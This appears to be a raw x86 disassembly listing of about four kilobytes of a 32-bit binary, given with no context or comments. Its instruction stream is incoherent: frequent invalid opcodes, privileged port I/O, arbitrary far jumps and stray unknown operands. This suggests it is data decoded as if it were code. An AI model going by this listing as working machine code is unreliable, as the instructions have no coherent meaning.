  4169fa:	mov    eax,0x40eff753
  4169ff:	mov    dl,0x4f
  416a01:	mov    bh,0x6f
  416a03:	(bad)  
  416a04:	addr16 add eax,0x715c8fd9
  416a0a:	cmp    ch,BYTE PTR [ebp-0x13823f96]
  416a10:	push   ds
  416a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a12:	sub    DWORD PTR [edx],edi
  416a14:	and    al,0xea
  416a16:	test   DWORD PTR [esi-0x60de8c6f],esi
  416a1c:	mov    ecx,DWORD PTR [ebx]
  416a1e:	shr    DWORD PTR [ecx],cl
  416a20:	lock push esi
  416a22:	xchg   edi,eax
  416a23:	int    0x1b
  416a25:	add    eax,0xeb890ef4
  416a2a:	test   BYTE PTR [ebx+0x282e3562],dh
  416a30:	sar    DWORD PTR [edx+0x104c0a2d],0x4f
  416a37:	call   0xe9455533
  416a3c:	retf   0xa90a
  416a3f:	clc    
  416a40:	(bad)  
  416a41:	push   ds
  416a42:	int3   
  416a43:	add    eax,0x22c6ddd7
  416a48:	shl    esi,1
  416a4a:	out    0x53,eax
  416a4c:	cmp    ch,BYTE PTR [eax]
  416a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a4f:	add    dh,BYTE PTR [edx-0x2e9ff402]
  416a55:	in     al,0x54
  416a57:	adc    BYTE PTR [ecx],0x99
  416a5a:	rcl    BYTE PTR [edx],cl
  416a5c:	xor    BYTE PTR [edi-0x41c95e70],al
  416a62:	pop    ss
  416a63:	js     0x416ac4
  416a65:	xchg   ebp,eax
  416a66:	inc    edx
  416a67:	clc    
  416a68:	jne    0x416aca
  416a6a:	cdq    
  416a6b:	call   0x5fe69f96
  416a70:	out    dx,al
  416a71:	dec    esp
  416a72:	retf   
  416a73:	icebp  
  416a74:	shl    DWORD PTR [ebx+0x6e],1
  416a77:	mov    ebp,0x19115038
  416a7c:	jp     0x416ad7
  416a7e:	mov    dl,0x9f
  416a80:	scas   al,BYTE PTR es:[edi]
  416a81:	imul   edx,DWORD PTR [edx+0x4f],0xffffffcf
  416a85:	mov    ch,0x9d
  416a87:	add    BYTE PTR [eax+0x1e49d944],0x9a
  416a8e:	sbb    esi,DWORD PTR [ecx-0x20e2b274]
  416a94:	call   0xf9a1add9
  416a99:	jle    0x416ad7
  416a9b:	mov    ah,0x53
  416a9d:	popa   
  416a9e:	xchg   BYTE PTR [ebx+eiz*4+0x54],ch
  416aa2:	xlat   BYTE PTR ds:[ebx]
  416aa3:	xchg   edx,eax
  416aa4:	jle    0x416af2
  416aa6:	idiv   BYTE PTR [ecx+0x61]
  416aa9:	fcomp  QWORD PTR [ebx]
  416aab:	(bad)  
  416aac:	xor    ecx,ebp
  416aae:	sahf   
  416aaf:	ret    
  416ab0:	sti    
  416ab1:	aaa    
  416ab2:	or     DWORD PTR [edi+0x18],esi
  416ab5:	xchg   esi,eax
  416ab6:	push   edi
  416ab7:	push   ecx
  416ab8:	mov    ecx,0x1933b69a
  416abd:	fld    QWORD PTR [esp+ebx*4+0xa]
  416ac1:	pusha  
  416ac2:	sbb    DWORD PTR [esi+0x6b],eax
  416ac5:	add    al,0xe7
  416ac7:	push   edi
  416ac8:	hlt    
  416ac9:	rcl    BYTE PTR [edx-0x4a001c5f],cl
  416acf:	pop    ss
  416ad0:	xchg   edi,eax
  416ad1:	jb     0x416b44
  416ad3:	push   ds
  416ad4:	cmc    
  416ad5:	cdq    
  416ad6:	jb     0x416b33
  416ad8:	jecxz  0x416a7f
  416ada:	in     eax,0xeb
  416adc:	inc    edi
  416add:	daa    
  416ade:	sahf   
  416adf:	add    esi,DWORD PTR [edx]
  416ae1:	ret    0xd0e5
  416ae4:	xchg   ebp,eax
  416ae5:	jle    0x416a88
  416ae7:	imul   BYTE PTR [ebp-0x4e]
  416aea:	adc    al,0x2
  416aec:	push   edx
  416aed:	jp     0x416b1b
  416aef:	sub    ch,BYTE PTR [edx+0x6b5a6b06]
  416af5:	out    dx,eax
  416af6:	int3   
  416af7:	inc    ebx
  416af8:	pop    esp
  416af9:	sbb    eax,0x73c95144
  416afe:	retf   0x9f87
  416b01:	bound  eax,QWORD PTR [edi]
  416b03:	adc    al,0xc6
  416b05:	ret    
  416b06:	mov    al,0xa2
  416b08:	jecxz  0x416aab
  416b0a:	les    esi,FWORD PTR [ebx+0x1c9a188]
  416b10:	jb     0x416b0e
  416b12:	xchg   edi,eax
  416b13:	sbb    dh,ch
  416b15:	dec    eax
  416b16:	stos   DWORD PTR es:[edi],eax
  416b17:	dec    esi
  416b18:	jo     0x416aad
  416b1a:	loop   0x416b79
  416b1c:	cmp    ah,dl
  416b1e:	jecxz  0x416aa3
  416b20:	mov    edx,0x4a821e6f
  416b25:	inc    eax
  416b26:	js     0x416b3b
  416b28:	ss aad 0xaf
  416b2b:	xlat   BYTE PTR ds:[ebx]
  416b2c:	das    
  416b2d:	jns    0x416ac0
  416b2f:	enter  0xb95c,0x68
  416b33:	dec    eax
  416b34:	out    dx,eax
  416b35:	jmp    0x253a:0x8ff71f32
  416b3c:	ins    BYTE PTR es:[edi],dx
  416b3d:	xlat   BYTE PTR ds:[ebx]
  416b3e:	mov    ebp,0xd002727f
  416b43:	mov    DWORD PTR [ecx+0x13],ebx
  416b46:	dec    eax
  416b47:	mov    bl,0x2c
  416b49:	cmp    cl,BYTE PTR [edi]
  416b4b:	lods   al,BYTE PTR ds:[esi]
  416b4c:	or     ah,BYTE PTR [eax]
  416b4e:	jge    0x416b02
  416b50:	jno    0x416aee
  416b52:	rcl    DWORD PTR [ebp-0x60928eae],0xa4
  416b59:	xchg   esp,eax
  416b5a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b5c:	xchg   esp,eax
  416b5d:	repnz lahf 
  416b5f:	dec    ebx
  416b60:	mov    WORD PTR [ebx],ss
  416b62:	icebp  
  416b63:	(bad)  
  416b64:	stc    
  416b65:	or     BYTE PTR [ebx+0x4d],0xc
  416b69:	ins    DWORD PTR es:[edi],dx
  416b6a:	lahf   
  416b6b:	pop    edx
  416b6c:	sub    dh,bh
  416b6e:	xchg   ebx,edx
  416b70:	daa    
  416b71:	aad    0xb7
  416b73:	les    esp,FWORD PTR [esi-0x213fa407]
  416b79:	push   0xffffffd4
  416b7b:	pop    ecx
  416b7c:	cmc    
  416b7d:	sub    al,0xd1
  416b7f:	jnp    0x416b0c
  416b81:	daa    
  416b82:	push   0xbc6e96e3
  416b87:	or     ebp,edx
  416b89:	xor    al,BYTE PTR [ecx+ecx*1-0x60caab13]
  416b90:	inc    esp
  416b91:	jmp    FWORD PTR [ebp+ebp*1+0x19]
  416b95:	sub    al,0x34
  416b97:	es popf 
  416b99:	jl     0x416b23
  416b9b:	xor    DWORD PTR [ecx+ebp*2-0x77],0x49
  416ba0:	xchg   DWORD PTR [ebx],ecx
  416ba2:	jbe    0x416bdb
  416ba4:	or     eax,0x950eb40f
  416ba9:	xchg   ebx,eax
  416baa:	ret    
  416bab:	adc    eax,DWORD PTR [ebx+0x11]
  416bae:	jb     0x416b6b
  416bb0:	pop    ebx
  416bb1:	shl    edx,cl
  416bb3:	mov    BYTE PTR [edi+ebx*1+0x6bb3456d],0x66
  416bbb:	xchg   ebp,eax
  416bbc:	mov    ah,0xa9
  416bbe:	xlat   BYTE PTR ds:[ebx]
  416bbf:	(bad)  
  416bc0:	popw   es
  416bc2:	retf   
  416bc3:	sbb    DWORD PTR [ebp+0x47],edi
  416bc6:	push   esp
  416bc7:	and    edi,0x50
  416bca:	(bad)  
  416bcb:	mov    cl,0xe8
  416bcd:	dec    ecx
  416bce:	pop    ebp
  416bcf:	shl    DWORD PTR ds:0xabc6655d,1
  416bd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bd6:	inc    edx
  416bd7:	inc    eax
  416bd8:	(bad)  
  416bda:	sub    DWORD PTR [ebx+ebp*8],ebp
  416bdd:	xor    DWORD PTR [esi-0x1663deab],edx
  416be3:	lods   eax,DWORD PTR ds:[esi]
  416be4:	outs   dx,BYTE PTR ds:[esi]
  416be5:	ficom  DWORD PTR [ebp-0x57]
  416be8:	jns    0x416c54
  416bea:	mov    eax,ds:0xada01472
  416bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf0:	stos   BYTE PTR es:[edi],al
  416bf1:	sub    DWORD PTR [esi+0x5c65b2fc],edi
  416bf7:	push   esp
  416bf8:	xor    al,BYTE PTR [ebx]
  416bfa:	xchg   DWORD PTR [ebx+0x3cc30da],edx
  416c00:	push   esi
  416c01:	aas    
  416c02:	cmp    eax,esi
  416c04:	outs   dx,BYTE PTR cs:[esi]
  416c06:	mov    ds:0xcafbb128,eax
  416c0b:	jbe    0x416c30
  416c0d:	mov    BYTE PTR [ebx+0x2d2aa33e],ah
  416c13:	sbb    esp,DWORD PTR [esi+0x5d]
  416c16:	adc    al,0x6f
  416c18:	inc    ebp
  416c19:	cwde   
  416c1a:	fwait
  416c1b:	mov    al,ds:0xf685b65f
  416c20:	xchg   edi,eax
  416c21:	leave  
  416c22:	pop    es
  416c23:	pop    eax
  416c24:	adc    al,0xba
  416c26:	or     ah,BYTE PTR [ecx-0x6d]
  416c29:	mov    bh,0x20
  416c2b:	fadd   QWORD PTR [bp+di+0x6a14]
  416c30:	add    eax,0x7f982c8a
  416c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c36:	xchg   DWORD PTR [ebx-0x6],esp
  416c39:	lahf   
  416c3a:	sbb    ebx,DWORD PTR [esi-0x2e]
  416c3d:	mul    BYTE PTR cs:[eax-0x3a50635d]
  416c44:	mov    ebx,0x1704118e
  416c49:	sub    al,0xbb
  416c4b:	scas   al,BYTE PTR es:[edi]
  416c4c:	add    ch,cl
  416c4e:	pop    ds
  416c4f:	scas   al,BYTE PTR es:[edi]
  416c50:	mov    cl,0x17
  416c52:	out    dx,al
  416c53:	pop    eax
  416c54:	pop    eax
  416c55:	stc    
  416c56:	ret    0x3dbf
  416c59:	dec    edi
  416c5a:	in     al,dx
  416c5b:	call   0xba7a6b64
  416c60:	cmp    al,0x55
  416c62:	mov    eax,0xe07bedc9
  416c67:	add    DWORD PTR [esi],0x4a
  416c6a:	(bad)  
  416c6c:	je     0x416c79
  416c6e:	mov    eax,ds:0xfe6cea09
  416c73:	out    0x93,al
  416c75:	sbb    al,0x3c
  416c77:	into   
  416c78:	out    dx,al
  416c79:	mov    al,ds:0xcc1870c0
  416c7e:	jmp    0x416c5a
  416c80:	cmp    al,0x5b
  416c82:	loope  0x416cc0
  416c84:	dec    eax
  416c85:	inc    ebx
  416c86:	(bad)  
  416c88:	mov    ch,0xae
  416c8a:	jmp    0x333c:0xb9c53a9a
  416c91:	(bad)  
  416c92:	in     al,dx
  416c93:	out    0x6,al
  416c95:	push   ds
  416c96:	imul   ecx,edi,0x659a4594
  416c9c:	adc    edi,DWORD PTR [ebx]
  416c9e:	cdq    
  416c9f:	(bad)  
  416ca0:	fild   WORD PTR [ebp-0x3d0258aa]
  416ca6:	(bad)  
  416ca7:	mov    ds:0xc3d72bd0,eax
  416cac:	aam    0x8
  416cae:	jge    0x416c31
  416cb0:	out    0x34,al
  416cb2:	aas    
  416cb3:	add    bh,BYTE PTR ds:0xe4a07494
  416cb9:	outs   dx,DWORD PTR ds:[esi]
  416cba:	inc    ebx
  416cbb:	cmp    eax,DWORD PTR [eax+0x68]
  416cbe:	popf   
  416cbf:	in     al,dx
  416cc0:	xchg   ebp,eax
  416cc1:	pop    es
  416cc2:	jecxz  0x416d0e
  416cc4:	adc    BYTE PTR [ebp+0x2723538d],dh
  416cca:	fst    QWORD PTR [ebx]
  416ccc:	inc    eax
  416ccd:	cmp    DWORD PTR [eax],ecx
  416ccf:	popa   
  416cd0:	repz mov bh,0x8e
  416cd3:	stos   BYTE PTR es:[edi],al
  416cd4:	push   ss
  416cd5:	and    dl,cl
  416cd7:	jle    0x416c5e
  416cd9:	lds    ebx,FWORD PTR [esi]
  416cdb:	fidivr WORD PTR [edx]
  416cdd:	int    0x47
  416cdf:	push   eax
  416ce0:	cli    
  416ce1:	or     al,0xe1
  416ce3:	mov    ch,0xb2
  416ce5:	jae    0x416cdb
  416ce7:	int3   
  416ce8:	dec    edi
  416ce9:	sub    ch,bh
  416ceb:	mov    ecx,0xfaf5fd94
  416cf0:	inc    ebx
  416cf2:	xor    DWORD PTR [edx],esi
  416cf4:	in     al,dx
  416cf5:	xchg   ebp,eax
  416cf6:	mov    dh,BYTE PTR [edx+0x72631c4b]
  416cfc:	into   
  416cfd:	mov    esp,0x15eeceae
  416d02:	jmp    0x1dc2:0xbb640d20
  416d09:	ss sub eax,0xcf016db4
  416d0f:	fisub  WORD PTR [eax-0x72]
  416d12:	push   ebp
  416d13:	ins    DWORD PTR es:[edi],dx
  416d14:	enter  0xc617,0xf7
  416d18:	pushf  
  416d19:	data16 jno 0x416ca0
  416d1c:	sbb    eax,0xc4df368a
  416d21:	push   ss
  416d22:	fisttp DWORD PTR [edi-0x53]
  416d25:	lods   al,BYTE PTR ds:[esi]
  416d26:	push   esi
  416d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d28:	inc    esi
  416d29:	nop
  416d2a:	mov    ch,0x30
  416d2c:	mov    dh,0x10
  416d2e:	int3   
  416d2f:	add    al,0xe4
  416d31:	pusha  
  416d32:	out    0x45,al
  416d34:	dec    edi
  416d35:	push   0x9
  416d37:	pop    edi
  416d38:	add    ah,BYTE PTR [ebx-0x17]
  416d3b:	test   DWORD PTR [eax+0x41],eax
  416d3e:	ins    DWORD PTR es:[edi],dx
  416d3f:	fcom   DWORD PTR [ecx-0x20a396b9]
  416d45:	mov    DWORD PTR [edx-0x3afe807e],ebx
  416d4b:	jge    0x416cf6
  416d4d:	sub    ebp,DWORD PTR [edi-0x30b917bf]
  416d53:	jo     0x416d17
  416d55:	mov    bh,0xa1
  416d57:	jge    0x416db8
  416d59:	jecxz  0x416d16
  416d5b:	mov    eax,ds:0xfb865d0d
  416d60:	sub    DWORD PTR [eax-0x5f],esi
  416d63:	xchg   esi,eax
  416d64:	mov    DWORD PTR ds:0xa38e5d,eax
  416d6a:	aam    0x75
  416d6c:	xor    eax,0xe7d65e9e
  416d71:	repz push edx
  416d73:	jbe    0x416ddd
  416d75:	or     DWORD PTR [ecx-0x4d],0x78429d0e
  416d7c:	(bad)  
  416d7e:	cmp    ch,BYTE PTR [edx+ebx*1+0x0]
  416d82:	jg     0x416dc6
  416d84:	jo     0x416d74
  416d86:	xchg   ebx,eax
  416d87:	inc    ebx
  416d88:	jmp    0x695e:0x5cee59c5
  416d8f:	pusha  
  416d90:	xor    BYTE PTR [ecx+0x38b6e77e],dl
  416d96:	xchg   ecx,edi
  416d98:	sti    
  416d99:	repz push 0xffffffc4
  416d9c:	popf   
  416d9d:	xchg   edx,eax
  416d9e:	cmp    BYTE PTR ds:0x51564ac7,dh
  416da4:	adc    ecx,DWORD PTR [esi-0x7f92de01]
  416daa:	test   eax,0x1e0b305d
  416daf:	jg     0x416d68
  416db1:	mov    dh,BYTE PTR [edx+0x40]
  416db4:	dec    esp
  416db5:	mov    edx,0x716a62b6
  416dba:	lods   eax,DWORD PTR ds:[esi]
  416dbb:	push   esp
  416dbc:	ret    0x85d0
  416dbf:	and    ch,BYTE PTR [edi]
  416dc1:	neg    DWORD PTR [edx-0x631a6c1d]
  416dc7:	cmp    ch,BYTE PTR [ecx+0x789efa2d]
  416dcd:	in     al,0x85
  416dcf:	xchg   esp,eax
  416dd0:	dec    edi
  416dd1:	inc    esi
  416dd2:	out    dx,al
  416dd3:	push   ss
  416dd4:	imul   DWORD PTR [ecx-0x4c63f53]
  416dda:	jmp    0xc149:0x91f0
  416de0:	fmul   DWORD PTR [eax]
  416de2:	and    al,0x7f
  416de4:	or     eax,0xce8c019c
  416de9:	test   edi,eax
  416deb:	inc    ebp
  416dec:	adc    bl,BYTE PTR ds:0xa57e39da
  416df2:	shl    DWORD PTR [eax-0x61],cl
  416df5:	sbb    al,0x51
  416df7:	cmp    BYTE PTR [eax-0x13],dl
  416dfa:	inc    ebp
  416dfb:	(bad)  
  416dfc:	inc    ebp
  416dfd:	pop    edi
  416dfe:	test   BYTE PTR [ebp-0x10bdcab],dh
  416e04:	xor    esp,ebp
  416e06:	xchg   esi,eax
  416e07:	cmp    DWORD PTR [esi],esp
  416e09:	mov    esi,0x5abb9eaa
  416e0e:	lds    ebx,FWORD PTR [ebx]
  416e10:	fnstcw WORD PTR [esi+eiz*1]
  416e13:	mov    ds:0xf55b76a5,eax
  416e18:	stos   BYTE PTR es:[edi],al
  416e19:	push   ebx
  416e1a:	in     al,dx
  416e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e1c:	inc    edx
  416e1d:	xlat   BYTE PTR ds:[ebx]
  416e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e1f:	or     BYTE PTR [eax],ch
  416e21:	scas   al,BYTE PTR es:[edi]
  416e22:	dec    eax
  416e23:	subps  xmm0,XMMWORD PTR [esi]
  416e26:	out    dx,eax
  416e27:	es push 0x1e
  416e2a:	or     ah,ah
  416e2c:	pop    ds
  416e2d:	push   ds
  416e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e2f:	xor    esp,edi
  416e31:	sbb    cl,BYTE PTR [ebp-0xf]
  416e34:	cmp    DWORD PTR [edi],0x281f9d5e
  416e3a:	retf   0x97df
  416e3d:	ins    BYTE PTR es:[edi],dx
  416e3e:	push   esp
  416e3f:	stc    
  416e40:	push   edi
  416e41:	push   0x79
  416e43:	pop    ebx
  416e44:	dec    ebx
  416e45:	stc    
  416e46:	in     eax,0xdd
  416e48:	out    0xb1,eax
  416e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e4b:	popa   
  416e4c:	push   ebx
  416e4d:	xor    bl,bh
  416e4f:	fisubr DWORD PTR [eax-0x267f2a42]
  416e55:	pop    esi
  416e56:	sbb    esp,DWORD PTR [esi-0x7e552862]
  416e5c:	je     0x416ec3
  416e5e:	adc    al,0xc0
  416e60:	aas    
  416e61:	je     0x416e5a
  416e63:	loope  0x416e95
  416e65:	add    al,0xbb
  416e67:	scas   eax,DWORD PTR es:[edi]
  416e68:	xchg   ebp,eax
  416e69:	mov    ebp,0xc741a08f
  416e6e:	or     BYTE PTR [esi+0xf06c4cf],0xfc
  416e75:	stos   DWORD PTR es:[edi],eax
  416e76:	outs   dx,DWORD PTR ds:[esi]
  416e77:	or     eax,0xbc3710a6
  416e7c:	push   edx
  416e7d:	rol    BYTE PTR [edi*2-0x334e117d],1
  416e84:	ss stos DWORD PTR es:[edi],eax
  416e86:	ins    DWORD PTR es:[edi],dx
  416e87:	(bad)  
  416e88:	mov    edx,0x2d688463
  416e8d:	outs   dx,DWORD PTR ds:[esi]
  416e8e:	xchg   ebp,eax
  416e8f:	pusha  
  416e90:	mov    eax,0xd1e7ca7e
  416e95:	mov    esp,DWORD PTR [eax-0x2]
  416e98:	push   cs
  416e99:	or     DWORD PTR ss:[edx],edi
  416e9c:	push   ecx
  416e9d:	xor    ebx,esi
  416e9f:	ss repnz ss pop eax
  416ea3:	pushf  
  416ea4:	jg     0x416e7d
  416ea6:	cmp    bl,cl
  416ea8:	ja     0x416e95
  416eaa:	and    esp,DWORD PTR [esi-0x4e]
  416ead:	xor    esi,DWORD PTR [ecx+0x2ca92c2f]
  416eb3:	sar    BYTE PTR [ecx],cl
  416eb5:	fild   DWORD PTR [esi-0x3d]
  416eb8:	scas   eax,DWORD PTR es:[edi]
  416eb9:	jnp    0x416e4b
  416ebb:	fiadd  WORD PTR [eax+0x2a7944]
  416ec1:	aaa    
  416ec2:	mov    eax,DWORD PTR [ecx+ecx*8]
  416ec5:	cli    
  416ec6:	push   cs
  416ec7:	dec    BYTE PTR [edx-0x44]
  416eca:	cmp    eax,0xe167bf4e
  416ecf:	xor    eax,0xa347f7a8
  416ed4:	dec    edx
  416ed5:	jbe    0x416e9d
  416ed7:	add    al,0x31
  416ed9:	xchg   esi,eax
  416eda:	inc    ebp
  416edb:	fcmovnu st,st(3)
  416edd:	stc    
  416ede:	mov    ecx,0x1a52b534
  416ee3:	mov    bl,0x6a
  416ee5:	das    
  416ee6:	sbb    al,0x1c
  416ee8:	sub    esi,DWORD PTR [edi+0x32]
  416eeb:	(bad)  
  416eec:	xor    esi,DWORD PTR [eax+0x6dc1fda8]
  416ef2:	jmp    0x8186:0xa82d1356
  416ef9:	stos   DWORD PTR es:[edi],eax
  416efa:	(bad)  
  416efb:	push   ss
  416efc:	adc    BYTE PTR [ebx],dl
  416efe:	xchg   edi,eax
  416eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f00:	retf   0x6f89
  416f03:	mov    ebp,0x3ffa8b9f
  416f08:	sub    ch,BYTE PTR [ebx]
  416f0a:	mov    ch,0x44
  416f0c:	aas    
  416f0d:	mov    al,0xcb
  416f0f:	mov    esp,0x80c938d0
  416f14:	sbb    eax,0x154890e0
  416f19:	add    dh,BYTE PTR [eax]
  416f1b:	lods   al,BYTE PTR ds:[esi]
  416f1c:	sti    
  416f1d:	dec    esp
  416f1e:	sbb    al,0x6e
  416f20:	ret    0x14c5
  416f23:	pop    ds
  416f24:	and    BYTE PTR [edx],bl
  416f26:	cmp    DWORD PTR [eax+0x37],eax
  416f29:	leave  
  416f2a:	inc    ebx
  416f2b:	dec    eax
  416f2c:	mov    edi,0xb031d408
  416f31:	push   cs
  416f32:	jmp    0x416fa1
  416f34:	test   eax,0xce753cab
  416f39:	add    al,0x44
  416f3b:	loope  0x416f8c
  416f3d:	(bad)  
  416f3e:	gs daa 
  416f40:	rcr    DWORD PTR [esi],1
  416f42:	sbb    DWORD PTR [edi-0x456fccf8],edx
  416f48:	xor    eax,0x253c91ec
  416f4d:	mov    edx,0x446af483
  416f52:	fsubr  st,st(1)
  416f54:	ins    BYTE PTR es:[edi],dx
  416f55:	dec    ecx
  416f56:	mov    ebp,0x89b19748
  416f5b:	inc    edi
  416f5c:	mov    bl,0xc2
  416f5e:	into   
  416f5f:	mov    ebp,0x337f2b06
  416f64:	scas   eax,DWORD PTR es:[edi]
  416f65:	popa   
  416f66:	enter  0xcf5d,0xda
  416f6a:	loope  0x416f40
  416f6c:	(bad)  
  416f6d:	sbb    ch,BYTE PTR [esi-0x45a57c10]
  416f73:	sahf   
  416f74:	xchg   edi,eax
  416f75:	fldcw  WORD PTR [eax+0x7ac65a21]
  416f7b:	inc    edi
  416f7c:	cdq    
  416f7d:	clc    
  416f7e:	or     al,0x89
  416f80:	mov    dh,bl
  416f82:	ds je  0x416f8e
  416f85:	(bad)  
  416f86:	pop    ecx
  416f87:	shr    DWORD PTR [esi-0x58],cl
  416f8a:	jecxz  0x416fec
  416f8c:	repnz bound ebx,QWORD PTR [edi-0x46c0c688]
  416f93:	xchg   esi,eax
  416f94:	mov    DWORD PTR [esi+0x540c59a],edi
  416f9a:	jle    0x416fbc
  416f9c:	jb     0x416ffe
  416f9e:	inc    edi
  416f9f:	aas    
  416fa0:	mov    ebx,0xfc4c96df
  416fa5:	push   eax
  416fa6:	jne    0x417008
  416fa8:	push   ecx
  416fa9:	xor    ebp,DWORD PTR [edx-0x17]
  416fac:	mov    esp,0xd50c067e
  416fb1:	mov    edx,0xf913a273
  416fb6:	mov    ebx,0xeb2bb237
  416fbb:	add    bh,BYTE PTR [edx-0x7f]
  416fbe:	test   al,0x20
  416fc0:	mov    bh,BYTE PTR [edx+edx*8-0x506247f2]
  416fc7:	push   ss
  416fc8:	cdq    
  416fc9:	and    BYTE PTR [esi+0x6],ah
  416fcc:	gs js  0x416f7d
  416fcf:	sbb    BYTE PTR [ebp-0xb7753d9],0x24
  416fd6:	out    dx,eax
  416fd7:	inc    edx
  416fd8:	mov    dh,0x6d
  416fda:	(bad)  
  416fdb:	jmp    0x41702e
  416fdd:	cmp    ecx,DWORD PTR [ebp+esi*1-0x2e]
  416fe1:	inc    eax
  416fe2:	loope  0x417001
  416fe4:	push   edx
  416fe5:	push   edx
  416fe6:	mov    cl,ch
  416fe8:	iret   
  416fe9:	frstor [ebx+0xb3c750d]
  416fef:	repz or BYTE PTR [ebx+0x1668781f],ah
  416ff6:	dec    edx
  416ff7:	imul   edi,DWORD PTR fs:[eax-0x2a2bce0e],0xb8afd4de
  417002:	mov    esp,0xaf627712
  417007:	inc    ebp
  417008:	or     eax,0xf432bf5b
  41700d:	fidivr DWORD PTR [edi+esi*1-0x5a]
  417011:	mov    DWORD PTR [edx-0x42],0x4282b458
  417018:	in     al,dx
  417019:	mov    WORD PTR [esi],?
  41701b:	mov    al,ds:0x94db3d91
  417020:	cli    
  417021:	jp     0x417081
  417023:	pop    ebx
  417024:	test   al,0x72
  417026:	inc    ebp
  417027:	test   BYTE PTR [ebp+0x51],dh
  41702a:	xor    eax,0x133e6837
  41702f:	and    al,0xc6
  417031:	imul   ebx,esp,0xd14231b0
  417037:	fidiv  DWORD PTR [eax]
  417039:	fwait
  41703a:	inc    eax
  41703b:	xchg   ebp,eax
  41703c:	std    
  41703d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41703e:	fisubr DWORD PTR [esi-0x124504d4]
  417044:	data16 mov BYTE PTR [eax+0x6c],cl
  417048:	pop    ss
  417049:	jo     0x417075
  41704b:	out    dx,eax
  41704c:	test   eax,0x6d4b3ecf
  417051:	sbb    cl,BYTE PTR [ecx]
  417053:	xor    al,0x5c
  417055:	xor    bh,dh
  417057:	in     al,dx
  417058:	or     eax,0x16b29a78
  41705d:	push   ecx
  41705e:	push   0x2ee0f58a
  417063:	sub    ah,dh
  417065:	loop   0x41706f
  417067:	stc    
  417068:	jnp    0x416feb
  41706a:	add    BYTE PTR [edx-0x4a],dl
  41706d:	jle    0x4170e6
  41706f:	jle    0x417090
  417071:	(bad)  
  417072:	xor    dl,BYTE PTR [ebx+0x66]
  417075:	inc    ebp
  417076:	sub    ebx,DWORD PTR [ebx]
  417078:	std    
  417079:	(bad)  
  41707a:	std    
  41707b:	xlat   BYTE PTR ds:[ebx]
  41707c:	mov    esp,0xe541ec94
  417082:	sbb    eax,0xb3e43e4b
  417087:	add    esi,edx
  417089:	cmp    ebx,ebx
  41708b:	(bad)  
  41708c:	adc    DWORD PTR gs:[esi-0x6180ed23],ecx
  417093:	sti    
  417094:	push   esi
  417095:	outs   dx,DWORD PTR ds:[esi]
  417096:	jmp    0x365ade
  41709b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41709c:	jns    0x417068
  41709e:	outs   dx,BYTE PTR ds:[esi]
  41709f:	add    BYTE PTR [edi+0x45aad466],dh
  4170a5:	jle    0x4170b4
  4170a7:	and    DWORD PTR [eax+0xf],edi
  4170aa:	pop    esi
  4170ab:	popf   
  4170ac:	stc    
  4170ad:	(bad)  
  4170ae:	inc    edx
  4170af:	aas    
  4170b0:	pop    DWORD PTR [ebx]
  4170b2:	out    0xe5,eax
  4170b4:	pusha  
  4170b5:	push   0xfffffff6
  4170b7:	leave  
  4170b8:	dec    ebx
  4170b9:	dec    ecx
  4170ba:	xchg   esp,eax
  4170bb:	inc    edx
  4170bc:	jp     0x417113
  4170be:	imul   esi,DWORD PTR [esi],0x7f
  4170c1:	ja     0x4170af
  4170c3:	and    edx,DWORD PTR [ebx+esi*2-0x35]
  4170c7:	dec    esp
  4170c8:	push   esi
  4170c9:	xlat   BYTE PTR ds:[ebx]
  4170ca:	dec    ecx
  4170cb:	adc    ebx,esp
  4170cd:	inc    eax
  4170ce:	idiv   BYTE PTR [ebx-0x75]
  4170d1:	fcmovb st,st(7)
  4170d3:	push   0x31cfab13
  4170d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d9:	pop    ds
  4170da:	xchg   BYTE PTR [eax],al
  4170dc:	xor    al,0x5a
  4170de:	jbe    0x417060
  4170e0:	popa   
  4170e1:	mov    ?,WORD PTR [ecx]
  4170e3:	jmp    0x1:0x675f950f
  4170ea:	inc    ebp
  4170eb:	jmp    0x6e49:0x2532e83b
  4170f2:	mov    dh,0xe3
  4170f4:	inc    esi
  4170f5:	cmc    
  4170f6:	sbb    dh,BYTE PTR ds:0x36caece5
  4170fc:	and    DWORD PTR fs:[esi+0x70],esi
  417100:	cwde   
  417101:	mov    cl,0x22
  417103:	add    BYTE PTR [eax-0x64],dl
  417106:	sub    eax,0x41289a0
  41710b:	cmp    ch,BYTE PTR [ebp+eax*4-0x7c]
  41710f:	or     esi,DWORD PTR [edx-0x12]
  417112:	mov    ds:0x25915cd9,eax
  417117:	nop
  417118:	mov    ebp,0xe53e681e
  41711d:	int    0x68
  41711f:	sbb    edx,edi
  417121:	stc    
  417122:	sbb    al,BYTE PTR [esi+0x76ada787]
  417128:	inc    edi
  417129:	cld    
  41712a:	or     al,0x7f
  41712c:	sbb    ch,BYTE PTR [esi-0x2d]
  41712f:	cwde   
  417130:	int3   
  417131:	push   esp
  417132:	xchg   edi,eax
  417133:	sti    
  417134:	addr16 pop eax
  417136:	jnp    0x417189
  417138:	pop    ds
  417139:	fidiv  WORD PTR [esi+0x15]
  41713c:	(bad)  
  41713d:	mov    ecx,0x7ec1aeb6
  417142:	daa    
  417143:	xor    eax,edi
  417145:	int    0x16
  417147:	imul   edx,DWORD PTR ds:0xe975959e,0x18
  41714e:	xchg   ebp,eax
  41714f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417150:	add    ebp,0x47632fdd
  417156:	out    dx,eax
  417157:	loopne 0x4171c3
  417159:	aaa    
  41715a:	pop    esp
  41715b:	ins    DWORD PTR es:[edi],dx
  41715c:	out    0xba,eax
  41715e:	cmc    
